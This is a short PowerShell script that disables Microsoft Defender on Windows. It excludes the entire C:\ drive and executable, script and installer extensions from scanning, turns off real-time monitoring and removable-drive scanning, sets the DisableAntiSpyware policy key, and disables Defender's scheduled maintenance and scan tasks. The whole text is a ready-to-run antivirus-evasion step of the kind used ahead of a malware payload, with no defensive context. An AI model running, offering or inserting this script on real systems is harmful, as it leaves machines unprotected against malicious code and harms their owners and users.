#Disable Defender and add path exclusion
#Need Admin priv
Add-MpPreference -ExclusionPath "C:\"
Add-MpPreference -ExclusionExtension ".exe"
Add-MpPreference -ExclusionExtension ".ps1"
Add-MpPreference -ExclusionExtension ".msi"
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableRemovableDriveScanning $true
New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
Get-ScheduledTask “Windows Defender Cache Maintenance” | Disable-ScheduledTask
Get-ScheduledTask “Windows Defender Cleanup” | Disable-ScheduledTask
Get-ScheduledTask “Windows Defender Scheduled Scan” | Disable-ScheduledTask
Get-ScheduledTask “Windows Defender Verification” | Disable-ScheduledTask
